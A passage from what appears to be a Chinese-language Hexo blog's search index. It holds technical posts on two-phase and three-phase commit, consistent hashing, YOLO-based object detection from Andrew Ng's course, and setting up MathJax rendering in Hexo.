分布式事务是指会涉及到操作多个数据库的事务。其实就是将对同一库事务的概念扩大到了对多个库的事务。目的是为了保证分布式系统中的数据一致性。分布式事务处理的关键是必须有一种方法可以知道事务在任何地方所做的所有动作，提交或回滚事务的决定必须产生统一的结果（全部提交或全部回滚） 如果想让分布式部署的多台机器中的数据保持一致性，那么就要保证在所有节点的数据写操作，要不全部都执行，要么全部的都不执行。但是，一台机器在执行本地事务的时候无法知道其他机器中的本地事务的执行结果。所以他也就不知道本次事务到底应该commit还是 roolback。所以，常规的解决办法就是引入一个“协调者”的组件来统一调度所有分布式节点的执行。 XA规范X/Open 组织（即现在的 Open Group ）定义了分布式事务处理模型。 X/Open DTP 模型（ 1994 ）包括应用程序（ AP ）、事务管理器（ TM ）、资源管理器（ RM ）、通信资源管理器（ CRM ）四部分。一般，常见的事务管理器（ TM ）是交易中间件，常见的资源管理器（ RM ）是数据库，常见的通信资源管理器（ CRM ）是消息中间件。 通常把一个数据库内部的事务处理，如对多个表的操作，作为本地事务看待。数据库的事务处理对象是本地事务，而分布式事务处理的对象是全局事务。 所谓全局事务，是指分布式事务处理环境中，多个数据库可能需要共同完成一个工作，这个工作即是一个全局事务，例如，一个事务中可能更新几个不同的数据库。对数据库的操作发生在系统的各处但必须全部被提交或回滚。此时一个数据库对自己内部所做操作的提交不仅依赖本身操作是否成功，还要依赖与全局事务相关的其它数据库的操作是否成功，如果任一数据库的任一操作失败，则参与此事务的所有数据库所做的所有操作都必须回滚。 一般情况下，某一数据库无法知道其它数据库在做什么，因此，在一个 DTP 环境中，交易中间件是必需的，由它通知和协调相关数据库的提交或回滚。而一个数据库只将其自己所做的操作（可恢复）影射到全局事务中。 XA 就是 X/Open DTP 定义的交易中间件与数据库之间的接口规范（即接口函数），交易中间件用它来通知数据库事务的开始、结束以及提交、回滚等。 XA 接口函数由数据库厂商提供。 二阶提交协议和三阶提交协议就是根据这一思想衍生出来的。可以说二阶段提交其实就是实现XA分布式事务的关键(确切地说，两阶段提交主要保证了分布式事务的原子性，即所有结点要么全做要么全不做) 一阶段提交(Best Efforts 1PC模式)一阶段提交非常直白，就是从应用程序向数据库发出提交请求到数据库完成提交或回滚之后将结果返回给应用程序的过程。一阶段提交不需要“协调者”角色，各结点之间不存在协调操作，因此其事务执行时间比两阶段提交要短 二阶段提交(Two-phaseCommit/2PC)参与者将操作成败通知协调者，再由协调者根据所有参与者的反馈情报决定各参与者是否要提交操作还是中止操作所谓的两个阶段是指：第一阶段：准备阶段(投票阶段)和第二阶段：提交阶段（执行阶段） 准备阶段 协调者节点向所有参与者节点询问是否可以执行提交操作(vote)，并开始等待各参与者节点的响应。 参与者节点执行询问发起为止的所有事务操作，并将Undo信息和Redo信息写入日志。（注意：若成功这里其实每个参与者已经执行了事务操作） 各参与者节点响应协调者节点发起的询问。如果参与者节点的事务操作实际执行成功，则它返回一个”同意”消息；如果参与者节点的事务操作实际执行失败，则它返回一个”中止”消息。 提交阶段 协调者节点向所有参与者节点发出”正式提交(commit)”的请求。 参与者节点正式完成操作，并释放在整个事务期间内占用的资源。 参与者节点向协调者节点发送”完成”消息。 协调者节点受到所有参与者节点反馈的”完成”消息后，完成事务。 如果任一参与者节点在第一阶段返回的响应消息为”中止”，或者 协调者节点在第一阶段的询问超时之前无法获取所有参与者节点的响应消息时 协调者节点向所有参与者节点发出”回滚操作(rollback)”的请求。 参与者节点利用之前写入的Undo信息执行回滚，并释放在整个事务期间内占用的资源。 参与者节点向协调者节点发送”回滚完成”消息。 协调者节点受到所有参与者节点反馈的”回滚完成”消息后，取消事务 不管最后结果如何，第二阶段都会结束当前事务 二阶段存在的问题 同步阻塞问题。执行过程中，所有参与节点都是事务阻塞型的。当参与者占有公共资源时，其他第三方节点访问公共资源不得不处于阻塞状态。 单点故障。由于协调者的重要性，一旦协调者发生故障。参与者会一直阻塞下去。尤其在第二阶段，协调者发生故障，那么所有的参与者还都处于锁定事务资源的状态中，而无法继续完成事务操作。（如果是协调者挂掉，可以重新选举一个协调者，但是无法解决因为协调者宕机导致的参与者处于阻塞状态的问题） 数据不一致。在二阶段提交的阶段二中，当协调者向参与者发送commit请求之后，发生了局部网络异常或者在发送commit请求过程中协调者发生了故障，这回导致只有一部分参与者接受到了commit请求。而在这部分参与者接到commit请求之后就会执行commit操作。但是其他部分未接到commit请求的机器则无法执行事务提交。于是整个分布式系统便出现了数据部一致性的现象。 二阶段无法解决的问题：协调者再发出commit消息之后宕机，而唯一接收到这条消息的参与者同时也宕机了。那么即使协调者通过选举协议产生了新的协调者，这条事务的状态也是不确定的，没人知道事务是否被已经提交 三阶段提交（Three-phase commit/3PC）改进了两阶段提交,3PC主要解决的单点故障问题，并减少阻塞 引入超时机制。同时在协调者和参与者中都引入超时机制。 在第一阶段和第二阶段中插入一个准备阶段。保证了在最后提交阶段之前各参与节点的状态是一致的。 除了引入超时机制之外，3PC把2PC的准备阶段再次一分为二，这样三阶段提交就有CanCommit、PreCommit、DoCommit三个阶段。 CanCommit阶段 事务询问 协调者向参与者发送CanCommit请求。询问是否可以执行事务提交操作。然后开始等待参与者的响应。 响应反馈 参与者接到CanCommit请求之后，正常情况下，如果其自身认为可以顺利执行事务，则返回Yes响应，并进入预备状态。否则反馈No PreCommit阶段假如协调者从所有的参与者获得的反馈都是Yes响应，那么就会执行事务的预执行 发送预提交请求 协调者向参与者发送PreCommit请求，并进入Prepared阶段。 事务预提交 参与者接收到PreCommit请求后，会执行事务操作，并将undo和redo信息记录到事务日志中。 响应反馈 如果参与者成功的执行了事务操作，则返回ACK响应，同时开始等待最终指令。 假如有任何一个参与者向协调者发送了No响应，或者等待超时之后，协调者都没有接到参与者的响应，那么就执行事务的中断。 发送中断请求 协调者向所有参与者发送abort请求。 中断事务 参与者收到来自协调者的abort请求之后（或超时之后，仍未收到协调者的请求），执行事务的中断。 doCommit阶段该阶段进行真正的事务提交，也可以分为以下两种情况 执行提交 发送提交请求 协调接收到参与者发送的ACK响应，那么他将从预提交状态进入到提交状态。并向所有参与者发送doCommit请求。 事务提交 参与者接收到doCommit请求之后，执行正式的事务提交。并在完成事务提交之后释放所有事务资源。 响应反馈 事务提交完之后，向协调者发送Ack响应。 完成事务 协调者接收到所有参与者的ack响应之后，完成事务 中断事务 协调者没有接收到参与者发送的ACK响应（可能是接受者发送的不是ACK响应，也可能响应超时），那么就会执行中断事务。 发送中断请求 协调者向所有参与者发送abort请求 事务回滚 参与者接收到abort请求之后，利用其在阶段二记录的undo信息来执行事务的回滚操作，并在完成回滚之后释放所有的事务资源。 反馈结果 参与者完成事务回滚之后，向协调者发送ACK消息 中断事务 协调者接收到参与者反馈的ACK消息之后，执行事务的中断 在doCommit阶段，如果参与者无法及时接收到来自协调者的doCommit或者rebort请求时，会在等待超时之后，会继续进行事务的提交。（其实这个应该是基于概率来决定的，当进入第三阶段时，说明参与者在第二阶段已经收到了PreCommit请求，那么协调者产生PreCommit请求的前提条件是他在第二阶段开始之前，收到所有参与者的CanCommit响应都是Yes。（一旦参与者收到了PreCommit，意味他知道大家其实都同意修改了）所以，一句话概括就是，当进入第三阶段时，由于网络超时等原因，虽然参与者没有收到commit或者abort响应，但是他有理由相信：成功提交的几率很大。 ） 2PC与3PC的区别 相对于2PC，3PC主要解决的单点故障问题，并减少阻塞，因为一旦参与者无法及时收到来自协调者的信息之后，他会默认执行commit。而不会一直持有事务资源并处于阻塞状态。但是这种机制也会导致数据一致性问题，因为，由于网络原因，协调者发送的abort响应没有及时被参与者接收到，那么参与者在等待超时之后执行了commit操作。这样就和其他接到abort命令并执行回滚的参与者之间存在数据不一致的情况。 维基百科对2PC和3PC区别的描述三阶段提交（英语：Three-phase commit），也叫三阶段提交协议（英语：Three-phase commit protocol），是在计算机网络及数据库的范畴下，使得一个分布式系统内的所有节点能够执行事务的提交的一种分布式算法。三阶段提交是为解决两阶段提交协议|的缺点而设计的。 与两阶段提交不同的是，三阶段提交是“非阻塞”协议。三阶段提交在两阶段提交的第一阶段与第二阶段之间插入了一个准备阶段，使得原先在两阶段提交中，参与者在投票之后，由于协调者发生崩溃或错误，而导致参与者处于无法知晓是否提交或者中止的“不确定状态”所产生的可能相当长的延时的问题[1]得以解决。 举例来说，假设有一个决策小组由一个主持人负责与多位组员以电话联络方式协调是否通过一个提案，以两阶段提交来说，主持人收到一个提案请求，打电话跟每个组员询问是否通过并统计回复，然后将最后决定打电话通知各组员。要是主持人在跟第一位组员通完电话后失忆，而第一位组员在得知结果并执行后老人痴呆，那么即使重新选出主持人，也没人知道最后的提案决定是什么，也许是通过，也许是驳回，不管大家选择哪一种决定，都有可能与第一位组员已执行过的真实决定不一致，老板就会不开心认为决策小组沟通有问题而解雇。三阶段提交即是引入了另一个步骤，主持人打电话跟组员通知请准备通过提案，以避免没人知道真实决定而造成决定不一致的失业危机。为什么能够解决二阶段提交的问题呢？回到刚刚提到的状况，在主持人通知完第一位组员请准备通过后两人意外失忆，即使没人知道全体在第一阶段的决定为何，全体决策组员仍可以重新协调过程或直接否决，不会有不一致决定而失业。那么当主持人通知完全体组员请准备通过并得到大家的再次确定后进入第三阶段，当主持人通知第一位组员请通过提案后两人意外失忆，这时候其他组员再重新选出主持人后，仍可以知道目前至少是处于准备通过提案阶段，表示第一阶段大家都已经决定要通过了，此时便可以直接通过。 后记了解了2PC和3PC之后，我们可以发现，无论是二阶段提交还是三阶段提交都无法彻底解决分布式的一致性问题。Google Chubby的作者Mike Burrows说过， there is only one consensus protocol, and that’s Paxos” – all other approaches are just broken versions of Paxos。 意即世上只有一种一致性算法，那就是Paxos，所有其他一致性算法都是Paxos算法的不完整版。","link":"/2016/11/11/%E4%B8%A4%E9%98%B6%E6%AE%B5%E6%8F%90%E4%BA%A4%E5%8D%8F%E8%AE%AE%E3%80%81%E4%B8%89%E9%98%B6%E6%AE%B5%E6%8F%90%E4%BA%A4%E5%8D%8F%E8%AE%AE/"},{"title":"一致哈希","text":"分布式算法在做服务器负载均衡时候可供选择的负载均衡的算法有很多，包括： 轮循算法(Round Robin)、哈希算法(HASH)、最少连接算法(Least Connection)、响应速度算法(Response Time)、加权法(Weighted )等。其中哈希算法是最为常用的算法. 典型的应用场景是： 有N台服务器提供缓存服务，需要对服务器进行负载均衡，将请求平均分发到每台服务器上，每台机器负责1/N的服务。 常用的算法是对hash结果取余数 (hash() mod N )：对机器编号从0到N-1，按照自定义的 hash()算法，对每个请求的hash()值按N取模，得到余数i，然后将请求分发到编号为i的机器。但这样的算法方法存在致命问题，如果某一台机器宕机，那么应该落在该机器的请求就无法得到正确的处理，这时需要将当掉的服务器从算法从去除，此时候会有(N-1)/N的服务器的缓存数据需要重新进行计算;如果新增一台机器，会有N /(N+1)的服务器的缓存数据需要进行重新计算。对于系统而言，这通常是不可接受的颠簸(因为这意味着大量缓存的失效或者数据需要转移)。那么，如何设计一个负载均衡策略，使得受到影响的请求尽可能的少呢? 在Memcached、Key-Value Store 、Bittorrent DHT、LVS中都采用了Consistent Hashing算法，可以说Consistent Hashing 是分布式系统负载均衡的首选算法。 一致哈希一致哈希是一种特殊的哈希算法。在使用一致哈希算法后，哈希表槽位数（大小）的改变平均只需要对 K/n 个关键字重新映射，其中 K是关键字的数量，n是槽位数量。然而在传统的哈希表中，添加或删除一个槽位的几乎需要对所有关键字进行重新映射。 一致哈希由MIT的Karger及其合作者提出，现在这一思想已经扩展到其它领域。在这篇1997年发表的学术论文中介绍了“一致哈希”如何应用于用户易变的分布式Web服务中。哈希表中的每一个代表分布式系统中一个节点，在系统添加或删除节点只需要移动 K/n项。 一致哈希也可用于实现健壮缓存来减少大型Web应用中系统部分失效带来的负面影响。 一致哈希的概念还被应用于分布式散列表（DHT）的设计。DHT使用一致哈希来划分分布式系统的节点。所有关键字都可以通过一个连接所有节点的覆盖网络高效地定位到某个节点。 使用场景一致哈希主要用来避免上面所说到的新增或减少服务器时，大量服务器缓存需要重新更新的问题。 一致哈希尽可能使同一个资源映射到同一台缓存服务器。这种方式要求增加一台缓存服务器时，新的服务器尽量分担存储其他所有服务器的缓存资源。减少一台缓存服务器时，其他所有服务器也可以尽量分担存储它的缓存资源。 一致哈希算法的主要思想是将每个缓存服务器与一个或多个哈希值域区间关联起来，其中区间边界通过计算缓存服务器对应的哈希值来决定。（定义区间的哈希函数不一定和计算缓存服务器哈希值的函数相同，但是两个函数的返回值的范围需要匹配。）如果一个缓存服务器被移除，则它会从对应的区间会被并入到邻近的区间，其他的缓存服务器不需要任何改变。 相关实现一致哈希将每个对象映射到圆环边上的一个点，系统再将可用的节点机器映射到圆环的不同位置。 查找某个对象对应的机器时，需要用一致哈希算法计算得到对象对应圆环边上位置，沿着圆环边上查找直到遇到某个节点机器，这台机器即为对象应该保存的位置。 删除一台节点机器时，这台机器上保存的所有对象都要移动到下一台机器。添加一台机器到圆环边上某个点时，这个点的下一台机器需要将这个节点前对应的对象移动到新机器上。更改对象在节点机器上的分布可以通过调整节点机器的位置来实现。 相关特性一致性hash算法提出了在动态变化的Cache环境中，判定哈希算法好坏的四个定义： 平衡性(Balance)平衡性是指哈希的结果能够尽可能分布到所有的缓冲中去，这样可以使得所有的缓冲空间都得到利用。很多哈希算法都能够满足这一条件。 单调性(Monotonicity)单调性是指如果已经有一些内容通过哈希分派到了相应的缓冲中，又有新的缓冲加入到系统中。哈希的结果应能够保证原有已分配的内容可以被映射到原有的或者新的缓冲中去，而不会被映射到旧的缓冲集合中的其他缓冲区。 分散性(Spread)在分布式环境中，终端有可能看不到所有的缓冲，而是只能看到其中的一部分。当终端希望通过哈希过程将内容映射到缓冲上时，由于不同终端所见的缓冲范围有可能不同，从而导致哈希的结果不一致，最终的结果是相同的内容被不同的终端映射到不同的缓冲区中。这种情况显然是应该避免的，因为它导致相同内容被存储到不同缓冲中去，降低了系统存储的效率。分散性的定义就是上述情况发生的严重程度。好的哈希算法应能够尽量避免不一致的情况发生，也就是尽量降低分散性。 负载(Load)负载问题实际上是从另一个角度看待分散性问题。既然不同的终端可能将相同的内容映射到不同的缓冲区中，那么对于一个特定的缓冲区而言，也可能被不同的用户映射为不同的内容。与分散性一样，这种情况也是应当避免的，因此好的哈希算法应能够尽量降低缓冲的负荷。 接下来主要讲解一下一致性哈希算法具体是如何设计的. 环形Hash空间按照常用的hash算法来将对应的key哈希到一个具有2^32次方个桶的空间中，即0~(2^32)-1的数字空间中。现在我们可以将这些数字头尾相连，想象成一个闭合的环形。如下图 把数据通过一定的hash算法处理后映射到环上现在我们将object1、object2、object3、object4四个对象通过特定的Hash函数计算出对应的key值，然后散列到Hash环上。如下图：Hash(object1) = key1；Hash(object2) = key2；Hash(object3) = key3；Hash(object4) = key4； 将机器通过hash算法映射到环上在采用一致性哈希算法的分布式集群中将新的机器加入，其原理是通过使用与对象存储一样的Hash算法将机器也映射到环中（一般情况下对机器的hash计算是采用机器的IP或者机器唯一的别名作为输入值），然后以顺时针的方向计算，将所有对象存储到离自己最近的机器中。假设现在有NODE1，NODE2，NODE3三台机器，通过Hash算法得到对应的KEY值，映射到环中，其示意图如下：Hash(NODE1) = KEY1;Hash(NODE2) = KEY2;Hash(NODE3) = KEY3; 通过上图可以看出对象与机器处于同一哈希空间中，这样按顺时针转动object1存储到了NODE1中，object3存储到了NODE2中，object2、object4存储到了NODE3中。在这样的部署环境中，hash环是不会变更的，因此，通过算出对象的hash值就能快速的定位到对应的机器中，这样就能找到对象真正的存储位置了。 机器的删除与添加普通hash求余算法最为不妥的地方就是在有机器的添加或者删除之后会照成大量的对象存储位置失效，这样就大大的不满足单调性了。下面来分析一下一致性哈希算法是如何处理的。 节点（机器）的删除以上面的分布为例，如果NODE2出现故障被删除了，那么按照顺时针迁移的方法，object3将会被迁移到NODE3中，这样仅仅是object3的映射位置发生了变化，其它的对象没有任何的改动。如下图： 节点（机器）的添加如果往集群中添加一个新的节点NODE4，通过对应的哈希算法得到KEY4，并映射到环中，如下图： 通过按顺时针迁移的规则，那么object2被迁移到了NODE4中，其它对象还保持这原有的存储位置。通过对节点的添加和删除的分析，一致性哈希算法在保持了单调性的同时，还是数据的迁移达到了最小，这样的算法对分布式集群来说是非常合适的，避免了大量数据迁移，减小了服务器的的压力。 平衡性根据上面的图解分析，一致性哈希算法满足了单调性和负载均衡的特性以及一般hash算法的分散性，但这还并不能当做其被广泛应用的原由，因为还缺少了平衡性。下面将分析一致性哈希算法是如何满足平衡性的。hash算法是不保证平衡的，如上面只部署了NODE1和NODE3的情况（NODE2被删除的图），object1存储到了NODE1中，而object2、object3、object4都存储到了NODE3中，这样就照成了非常不平衡的状态。在一致性哈希算法中，为了尽可能的满足平衡性，其引入了虚拟节点。 “虚拟节点”（ virtual node ）是实际节点（机器）在 hash 空间的复制品（ replica ），一实际个节点（机器）对应了若干个“虚拟节点”，这个对应个数也成为“复制个数”，“虚拟节点”在 hash 空间中以hash值排列。 以上面只部署了NODE1和NODE3的情况（NODE2被删除的图）为例，之前的对象在机器上的分布很不均衡，现在我们以2个副本（复制个数）为例，这样整个hash环中就存在了4个虚拟节点，最后对象映射的关系图如下： 根据上图可知对象的映射关系：object1-&gt;NODE1-1，object2-&gt;NODE1-2，object3-&gt;NODE3-2，object4-&gt;NODE3-1。通过虚拟节点的引入，对象的分布就比较均衡了。那么在实际操作中，正真的对象查询是如何工作的呢？对象从hash到虚拟节点到实际节点的转换如下图： “虚拟节点”的hash计算可以采用对应节点的IP地址加数字后缀的方式。例如假设NODE1的IP地址为192.168.1.100。引入“虚拟节点”前，计算 cache A 的 hash 值：Hash(“192.168.1.100”);引入“虚拟节点”后，计算“虚拟节”点NODE1-1和NODE1-2的hash值：Hash(“192.168.1.100#1”); // NODE1-1Hash(“192.168.1.100#2”); // NODE1-2 总结目前一致性哈希基本成为了分布式系统组件的标准配置，例如Memcached的各种客户端都提供内置的一致性哈希支持。本文只是简要介绍了这个算法，更深入的内容可以参看论文《Consistent Hashing and Random Trees: Distributed Caching Protocols for Relieving Hot Spots on the World Wide Web》，同时提供一个C语言版本的实现供参考。","link":"/2016/11/20/%E4%B8%80%E8%87%B4%E5%93%88%E5%B8%8C/"},{"title":"吴恩达目标检测课堂笔记","text":"目标检测是计算机视觉领域中一个新兴的应用方向，其任务是对输入图像进行分类的同时，检测图像中是否包含某些目标，并对他们准确定位并标识。 本文所涉及的目标检测算法是 Ng 课堂上所讲的 YOLO，除此之外流行的还有 RCNN、Fast RCNN、Faster RCNN 和 SSD。 相关链接： 代码示例 YOLO: Real-Time Object Detection 目标检测 ppt 文件 密码：kt2h SSD github项目 目标定位定位分类问题不仅要求判断出图片中物体的种类，还要在图片中标记出它的具体位置，用边框（Bounding Box，或者称包围盒）把物体圈起来。一般来说，定位分类问题通常只有一个较大的对象位于图片中间位置；而在目标检测问题中，图片可以含有多个对象，甚至单张图片中会有多个不同分类的对象。 为了定位图片中汽车的位置，可以让神经网络多输出 4 个数字，标记为 $b_x$、$b_y$、$b_h$、$b_w$。将图片左上角标记为 (0, 0)，右下角标记为 (1, 1)，则有： 红色方框的中心点：($b_x$，$b_y$) 边界框的高度：$b_h$ 边界框的宽度：$b_w$ 因此，训练集不仅包含对象分类标签，还包含表示边界框的四个数字。定义目标标签 Y 如下： \\left[\\begin{matrix}P_c\\\\ b_x\\\\ b_y\\\\ b_h\\\\ b_w\\\\ c_1\\\\ c_2\\\\ c_3\\end{matrix}\\right]则有： P_c=1, Y = \\left[\\begin{matrix}1\\\\ b_x\\\\ b_y\\\\ b_h\\\\ b_w\\\\ c_1\\\\ c_2\\\\ c_3\\end{matrix}\\right]其中，$c_n$ 表示存在第 n个种类的概率；如果 $P_c=0$，表示没有检测到目标，则输出标签后面的 7 个参数都是无效的，可以忽略（用 ? 来表示）。 P_c=0, Y = \\left[\\begin{matrix}0\\\\ ?\\\\ ?\\\\ ?\\\\ ?\\\\ ?\\\\ ?\\\\ ?\\end{matrix}\\right]损失函数可以表示为 $L(\\hat y, y)$，如果使用平方误差形式，对于不同的 $P_c$有不同的损失函数（注意下标 i指标签的第 i个值）： $P_c=1$，即$y_1=1$：$L(\\hat y,y)=(\\hat y_1-y_1)^2+(\\hat y_2-y_2)^2+\\cdots+(\\hat y_8-y_8)^2$ $P_c=0$，即$y_1=0$：$L(\\hat y,y)=(\\hat y_1-y_1)^2$ 除了使用平方误差，也可以使用逻辑回归损失函数，类标签 $c_1$,$c_2$,$c_3$ 也可以通过 softmax 输出。相比较而言，平方误差已经能够取得比较好的效果。 特征点检测神经网络可以像标识目标的中心点位置那样，通过输出图片上的特征点，来实现对目标特征的识别。在标签中，这些特征点以多个二维坐标的形式表示。 通过检测人脸特征点可以进行情绪分类与判断，或者应用于 AR 领域等等。也可以透过检测姿态特征点来进行人体姿态检测。 目标检测想要实现目标检测，可以采用基于滑动窗口的目标检测（Sliding Windows Detection）算法。该算法的步骤如下： 训练集上搜集相应的各种目标图片和非目标图片，样本图片要求尺寸较小，相应目标居于图片中心位置并基本占据整张图片。 使用训练集构建 CNN 模型，使得模型有较高的识别率。 选择大小适宜的窗口与合适的固定步幅，对测试图片进行从左到右、从上倒下的滑动遍历。每个窗口区域使用已经训练好的 CNN 模型进行识别判断。 可以选择更大的窗口，然后重复第三步的操作。 滑动窗口目标检测的优点是原理简单，且不需要人为选定目标区域；缺点是需要人为直观设定滑动窗口的大小和步幅。滑动窗口过小或过大，步幅过大均会降低目标检测的正确率。另外，每次滑动都要进行一次 CNN 网络计算，如果滑动窗口和步幅较小，计算成本往往很大。 所以，滑动窗口目标检测算法虽然简单，但是性能不佳，效率较低。 基于卷积的滑动窗口实现相比从较大图片多次截取，在卷积层上应用滑动窗口目标检测算法可以提高运行速度。所要做的仅是将全连接层换成卷积层，即使用与上一层尺寸一致的滤波器进行卷积运算。 如图，对于 16x16x3 的图片，步长为 2，CNN 网络得到的输出层为 2x2x4。其中，2x2 表示共有 4 个窗口结果。对于更复杂的 28x28x3 的图片，得到的输出层为 8x8x4，共 64 个窗口结果。最大池化层的宽高和步长相等。 运行速度提高的原理：在滑动窗口的过程中，需要重复进行 CNN 正向计算。因此，不需要将输入图片分割成多个子集，分别执行向前传播，而是将它们作为一张图片输入给卷积网络进行一次 CNN 正向计算。这样，公共区域的计算可以共享，以降低运算成本。 相关论文：Sermanet et al., 2014. OverFeat: Integrated Recognition, Localization and Detection using Convolutional Networks 边框预测（YOLO）在上述算法中，边框的位置可能无法完美覆盖目标，或者大小不合适，或者最准确的边框并非正方形，而是长方形。 YOLO（You Only Look Once） 算法可以用于得到更精确的边框。YOLO 算法将原始图片划分为 n×n 网格，并将目标定位一节中提到的图像分类和目标定位算法，逐一应用在每个网格中，每个网格都有标签如： \\left[\\begin{matrix}P_c\\\\ b_x\\\\ b_y\\\\ b_h\\\\ b_w\\\\ c_1\\\\ c_2\\\\ c_3\\end{matrix}\\right]若某个目标的中点落在某个网格，则该网格负责检测该对象。 如上面的示例中，如果将输入的图片划分为 3×3 的网格、需要检测的目标有 3 类，则每一网格部分图片的标签会是一个 8 维的列矩阵，最终输出的就是大小为 3×3×8 的结果。要得到这个结果，就要训练一个输入大小为 100×100×3，输出大小为 3×3×8 的 CNN。在实践中，可能使用更为精细的 19×19 网格，则两个目标的中点在同一个网格的概率更小。 YOLO 算法的优点： 和图像分类和目标定位算法类似，显式输出边框坐标和大小，不会受到滑窗分类器的步长大小限制。 仍然只进行一次 CNN 正向计算，效率很高，甚至可以达到实时识别。 如何编码边框 $b_x$、$b_y$、$b_h$、$b_w$？YOLO 算法设 $b_x$、$b_y$、$b_h$、$b_w$ 的值是相对于网格长的比例。则 $b_x$、$b_y$ 在 0 到 1 之间，而 $b_h$、$b_w$ 可以大于 1。当然，也有其他参数化的形式，且效果可能更好。这里只是给出一个通用的表示方法。 相关论文：Redmon et al., 2015. You Only Look Once: Unified, Real-Time Object Detection。 Ng 认为该论文较难理解。 交互比交互比（IoU, Intersection Over Union）函数用于评价对象检测算法，它计算预测边框和实际边框交集（I）与并集（U）之比： IoU = \\frac{I}{U}IoU 的值在 0～1 之间，且越接近 1 表示目标的定位越准确。IoU 大于等于 0.5 时，一般可以认为预测边框是正确的，当然也可以更加严格地要求一个更高的阈值。 非极大值抑制YOLO 算法中，可能有很多网格检测到同一目标。非极大值抑制（Non-max Suppression）会通过清理检测结果，找到每个目标中点所位于的网格，确保算法对每个目标只检测一次。 进行非极大值抑制的步骤如下： 将包含目标中心坐标的可信度 P_c 小于阈值（例如 0.6）的网格丢弃； 选取拥有最大 P_c 的网格； 分别计算该网格和其他所有网格的 IoU，将 IoU 超过预设阈值的网格丢弃； 重复第 2~3 步，直到不存在未处理的网格。 上述步骤适用于单类别目标检测。进行多个类别目标检测时，对于每个类别，应该单独做一次非极大值抑制。 Anchor Boxes到目前为止，我们讨论的情况都是一个网格只检测一个对象。如果要将算法运用在多目标检测上，需要用到 Anchor Boxes。一个网格的标签中将包含多个 Anchor Box，相当于存在多个用以标识不同目标的边框。 在上图示例中，我们希望同时检测人和汽车。因此，每个网格的的标签中含有两个 Anchor Box。输出的标签结果大小从 3×3×8 变为 3×3×16。若两个 P_c 都大于预设阈值，则说明检测到了两个目标。 在单目标检测中，图像中的目标被分配给了包含该目标中点的那个网格；引入 Anchor Box 进行多目标检测时，图像中的目标则被分配到了包含该目标中点的那个网格以及具有最高 IoU 值的该网格的 Anchor Box。 Anchor Boxes 也有局限性，对于同一网格有三个及以上目标，或者两个目标的 Anchor Box 高度重合的情况处理不好。 Anchor Box 的形状一般通过人工选取。高级一点的方法是用 k-means 将两类对象形状聚类，选择最具代表性的 Anchor Box。 如果对以上内容不是很理解，在“3.9 YOLO 算法”一节中视频的第 5 分钟，有一个更为直观的示例。 R-CNN前面介绍的滑动窗口目标检测算法对一些明显没有目标的区域也进行了扫描，这降低了算法的运行效率。为了解决这个问题，R-CNN（Region CNN，带区域的 CNN）被提出。通过对输入图片运行图像分割算法，在不同的色块上找出候选区域（Region Proposal），就只需要在这些区域上运行分类器。 R-CNN 的缺点是运行速度很慢，所以有一系列后续研究工作改进。例如 Fast R-CNN（与基于卷积的滑动窗口实现相似，但得到候选区域的聚类步骤依然很慢）、Faster R-CNN（使用卷积对图片进行分割）。不过大多数时候还是比 YOLO 算法慢。 相关论文： R-CNN：Girshik et al., 2013. Rich feature hierarchies for accurate object detection and semantic segmentation Fast R-CNN：Girshik, 2015. Fast R-CNN Faster R-CNN：Ren et al., 2016. Faster R-CNN: Towards real-time object detection with region proposal networks","link":"/2018/07/10/%E5%90%B4%E6%81%A9%E8%BE%BE%E7%9B%AE%E6%A0%87%E6%A3%80%E6%B5%8B%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0/"},{"title":"在Hexo中渲染MathJax数学公式","text":"最近学机器学习涉及很多的数学公式，公式如果用截图显示，会比较low而且不方便。因此需要对Hexo做些配置，支持公式渲染。同时文末整理了各种公式的书写心得，比如矩阵、大小括号、手动编号、上下角标和多行对其等，有兴趣的可以看看。 通过hexo-math插件安装MathJax有个插件hexo-math，可以给Hexo博客添加MathJax公式支持，GitHub地址 https://github.com/hexojs/hexo-math 安装方法可其他hexo插件一样，在博客根目录执行npm install hexo-math —save安装，配置见GitHub说明页，这里我没有通过这种方式安装，而是直接在主题配置中添加MathJax的js来安装的。 在主题中手动添加js安装MathJax类似所有第三方js插件，js加载方式有两种： 第一种，通过连接CDN加载js代码。好处是省了本地配置js代码，并且每次加载都是最新的，缺点是一旦连接的CDN出问题，可能卡住页面的js加载。 第二种，将js代码下载下来，放到主题的js文件夹中，通过本地相对目录加载。优缺点和第一种方法正相反。 这里我选择通过CDN加载，因为把代码下载下来后发现有好多js，搞不清楚其中的引用关系，还是直接用官方给出的通过CDN加载的简便方法吧：Getting Started with MathJax 又综合了网上其他人给出的一些配置，最终代码如下。 在themes/free2mind/layout/_partial 目录中新建mathjax.ejs，填入如下js代码：123456789101112131415161718192021222324252627282930313233343536&lt;!-- MathJax配置，可通过单美元符号书写行内公式等 --&gt;&lt;script type=\"text/x-mathjax-config\"&gt; MathJax.Hub.Config({ \"HTML-CSS\": { preferredFont: \"TeX\", availableFonts: [\"STIX\",\"TeX\"], linebreaks: { automatic:true }, EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50) }, tex2jax: { inlineMath: [ [\"$\", \"$\"], [\"\\\\(\",\"\\\\)\"] ], processEscapes: true, ignoreClass: \"tex2jax_ignore|dno\", skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'] }, TeX: { equationNumbers: { autoNumber: \"AMS\" }, noUndefined: { attributes: { mathcolor: \"red\", mathbackground: \"#FFEEEE\", mathsize: \"90%\" } }, Macros: { href: \"{}\" } }, messageStyle: \"none\" }); &lt;/script&gt;&lt;!-- 给MathJax元素添加has-jax class --&gt;&lt;script type=\"text/x-mathjax-config\"&gt; MathJax.Hub.Queue(function() { var all = MathJax.Hub.getAllJax(), i; for(i=0; i &lt; all.length; i += 1) { all[i].SourceElement().parentNode.className += ' has-jax'; } });&lt;/script&gt;&lt;!-- 通过连接CDN加载MathJax的js代码 --&gt;&lt;script type=\"text/javascript\" async src=\"https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML\"&gt;&lt;/script&gt; 只在有公式的页面才加载MathJax有公式才加载MathJax，这点比较重要，没有公式仍然加载js渲染公式，会影响页面加载速度。 在所有有公式的文章的front-matter中增加一项配置 mathjax: true，例如：12345678910---title: 结构化机器学习项目tags: - 机器学习categories: - 机器学习date: 2017-10-9 22:22:00toc: falsemathjax: true--- 然后在themes/free2mind/layout/_partial/footer.ejs 中通过此配置变量决定是否加载mathjax.ejs ：1234&lt;!-- 根据页面mathjax变量决定是否加载MathJax数学公式js --&gt;&lt;% if (page.mathjax){ 